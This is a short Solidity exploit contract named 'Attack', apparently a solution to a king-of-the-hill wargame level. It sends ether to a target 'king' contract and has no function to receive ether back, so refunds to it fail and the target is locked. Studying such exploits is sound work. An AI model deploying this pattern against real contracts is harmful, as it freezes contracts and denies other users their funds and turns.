pragma solidity ^0.8.0;

contract Attack {
  address payable public king;

  constructor(address _king) {
    king = payable(_king);
  }

  function attack() public payable {
    (bool ok, ) = king.call{value: msg.value}("");
    require(ok);
  }
}